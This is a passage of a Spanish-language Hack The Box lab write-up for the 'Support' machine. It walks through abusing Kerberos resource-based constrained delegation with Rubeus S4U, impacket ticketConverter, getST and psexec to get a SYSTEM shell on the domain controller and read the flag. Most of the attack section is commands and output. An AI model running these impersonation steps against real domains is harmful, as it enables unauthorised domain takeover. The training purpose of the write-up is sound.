[*] Action: S4U
[*] Building S4U2self request for: 'SERVICEA$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'SERVICEA$@SUPPORT.HTB'
[*] base64(ticket.kirbi):
...
...
[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
...
...
[+] Ticket successfully imported!
```
Al final aparece el ticket creado en **base64**.

* Podemos listar los tickets creados:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe klist
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___

  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
*
  v2.2.0
*
Action: List Kerberos Tickets (Current User)
[*] Current LUID    : 0x80d455
  UserName                 : support
  Domain                   : SUPPORT
  LogonId                  : 0x80d455
  UserSID                  : S-1-5-21-1677581083-3380853377-188903654-1105
  AuthenticationPackage    : NTLM
  LogonType                : Network
  LogonTime                : 9/28/2024 8:28:01 PM
  LogonServer              : DC
  LogonServerDNSDomain     : support.htb
  UserPrincipalName        : support@support.htb
    [0] - 0x12 - aes256_cts_hmac_sha1
      Start/End/MaxRenew: 9/28/2024 9:28:50 PM ; 9/29/2024 7:28:50 AM ; 10/5/2024 9:28:50 PM
      Server Name       : cifs/dc.support.htb @ SUPPORT.HTB
      Client Name       : administrator @ SUPPORT.HTB
      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
```
Ahí vemos que el ticket que se generó siendo un **Ticket de Servicio (TGS)**, que sirve para **suplantar al usuario Administrador**.

Con este ticket creado, podemos seguir con el ataque para loguearnos como el administrador. Esto es bastante similar al **Silver Ticket Attack**.

Podemos hacer esto de dos formas:

* *Primera Forma*: Utilizando la herramienta **ticketConverter.py** de **impacket**, que lo que hace es convertir los **archivos kirbi** (comúnmente utilizados por mimikatz) en **archivos ccache** utilizados por **impacket**, con esto usaremos el **path del archivo ccache** y lo exportaremos a la **variable KRB5CCNAME** para que podamos usar el ticket y autenticarnos en el **servicio Kerberos** sin contraseña usando **psexec.py**.

* *Segunda Forma*: Utilizando la herramienta **getST** de **impacket**, que nos va a generar un **Service Ticket (TGS) en un archivo ccache** y de igual forma, vamos a añadirlo a la **variable KRB5CCNAME** y a autenticarnos con **psexec.py**

Nada más antes de continuar, veamos que es un **archivo ccache**:

| **Archivo ccache** |
|:-----------:|
| *Un ccache (o Credential Cache) es un archivo o una ubicación en memoria donde el sistema operativo almacena los tickets de Kerberos obtenidos durante la autenticación de un usuario. Estos tickets se utilizan para autenticar al usuario en otros servicios dentro de una red sin necesidad de que este vuelva a ingresar sus credenciales (contraseña o token) repetidamente. Este mecanismo permite implementar Single Sign-On (SSO) de manera eficiente.* |

Creo que queda bastante claro, continuemos.

#### Primera Forma: Usando ticketConverter.py y psexec de Impacket Para Autenticarnos en Servicio Kerberos Como Administrador {#forma1}

* Copia el **hash en base64** y guardalo en un archivo llamado **ticket.kirbi.b64**:
```bash
echo "hash_base64" | tr -d " " > ticket.kirbi.b64
```

* Vamos a decodificar el ticket que está en **base64** con el comando `base64 -d` y lo guardamos en otro archivo:
```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

* Utilicemos la herramienta **ticketConverter.py** para crear el **archivo ccache** y lo exportamos a la **variable KRB5CCNAME**:
```bash
ticketConverter.py ticket.kirbi ticket.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] converting kirbi to ccache...
[+] done
export KRB5CCNAME=ticket.ccache
```

* Por último, vamos a usar **psexec** para autenticarnos en el servicio Kerberos, usaré el **psexec de impacket**:
```batch
impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file UseADnsr.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service vHKy on dc.support.htb.....
[*] Starting service vHKy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.
*
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> ipconfig
*
Windows IP Configuration
*
Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.11.174
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```

#### Segunda Forma: Usando getST y Psexec de Impacket Para Autenticarnos en Servicio Kerberos Como Administrador {#forma2}

Esta forma la encontramos en el siguiente **GitHub** que, tiene un script que automatiza todo el ataque (quizá en otra máquina lo probaremos o puedes probarle en esta):
* <a href="https://github.com/tothi/rbcd-attack/tree/master" target="_blank">Repositorio de tothi: Abusing Kerberos Resource-Based Constrained Delegation</a>

Empecemos:

* Utilicemos **impacket-getST** para crear un **CIFS Service Ticket** en un **archivo ccache**:
```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA$:123456
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

* Exportemos el **archivo ccache** en la **variable KRB5CCNAME**:
```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

* Y usemos **psexec de impacket** para autenticarnos en el **servicio Kerberos**:
```batch
impacket-psexec -k dc.support.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra
[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file xIguRZux.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service kBtV on dc.support.htb.....
[*] Starting service kBtV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.
*
C:\Windows\system32> whoami
nt authority\system
```

* Busquemos la flag:
```batch
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB
 Directory of C:\Users\Administrator\Desktop
05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
09/28/2024  10:06 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,946,958,848 bytes free
C:\Users\Administrator\Desktop> type root.txt
...
```

Con esto, terminamos la máquina.
